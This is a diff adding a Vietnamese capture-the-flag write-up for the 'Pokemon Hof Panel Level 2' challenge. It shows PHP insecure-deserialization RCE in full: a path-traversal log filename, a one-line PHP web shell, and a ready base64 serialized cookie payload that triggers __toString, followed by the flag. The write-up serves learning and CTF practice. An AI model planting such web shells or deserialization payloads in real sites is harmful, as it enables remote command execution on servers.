@@ -1,0 +1,47 @@
+# Pokemon Hof Panel Level 2 
+
+> bài này sau khi giải kết thúc thì mình đọc wu của các anh thì mới ngộ ra ( lúc làm mình đã có ý tưởng nhưng mà ẩu quá nên bỏ :> gà quá huhu)
+
+Bài này thì cơ bản vẫn giống bài level1 nhưng bài này yêu cầu chúng ta RCE dựa vào các method_magic trong php như *__contructer*, *__destructer*, *__toString*
+
+chúng ta cùng nhìn vào *class Utils*
+
+![Alt text](image.png)
+
+bạn đấy hàm to_String() , nó tự gọi hàm  writelog() , khi mà object của mình được sử dụng như một String , nhìn vào đây :
+
+```
+  file_put_contents("/tmp/logs/".date('H_i_s').$this->logfile, $this->error);
+```
+tham số 1 chính là postion mà log file được lưu , tham số thứ hai là content của file đó 
+nếu như giờ phần content đó là shell code và file name là file PHP thì mình đã RCE được đúng không ? 
+Vấn đề nằm ở đây là : 
+   - Làm sao back folder vì tmps/logs :  người dùng bình không vào được ? 
+   vậy payload cần truyền vào đoạn đó là :  
+   ```
+   ../../../../../var/www/html/khanh.php
+   ```
+bởi vì server là apache **Server: Apache/2.4.57 (Debian)**
+  - Shell code : 
+  ```
+  <?php   system(\$_GET['cmd']); ?>
+  ```
+  - Làm sao trigger được *__ToString()* chạy được , ( mình  bị ngu đoạn này trong thời gian giải diễn ra @@ ), để ý src của  nó thì thấy khi isChampion của user -> true thì mình vào được và nó có nối chuỗi với $user->name ( sẽ ra sao nếu $user->name của mình chính là object của class Utils -> có phải nó sẽ trigger được toString không ?)
+  tiến mình ghép các payload lại hoàn chỉnh như sau  : 
+
+  ![Alt text](image-1.png)
+ 
+ ```
+ Tzo3OiJUcmFpbmVyIjozOntzOjQ6Im5hbWUiO086NToiVXRpbHMiOjI6e3M6NToiZXJyb3IiO3M6MzE6Ijw/cGhwICBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iO3M6NzoibG9nZmlsZSI7czozNzoiLi4vLi4vLi4vLi4vLi4vdmFyL3d3dy9odG1sL2toYW5oLnBocCI7fXM6Nzoic3RhcnRlciI7TjtzOjEwOiJpc0NoYW1waW9uIjtiOjE7fQ==
+ ```
+  giờ lấy nó thay vào biến cookie và send là chúng ta sẽ up được shell code 
+
+  ![Alt text](image-2.png)
+  
+  giờ thì lấy flag ra thôi !
+
+  # FLAG 
+
+  ```
+  KCSC{w3lc0me_t0_h4ll_0f_f4m3}
+  ```
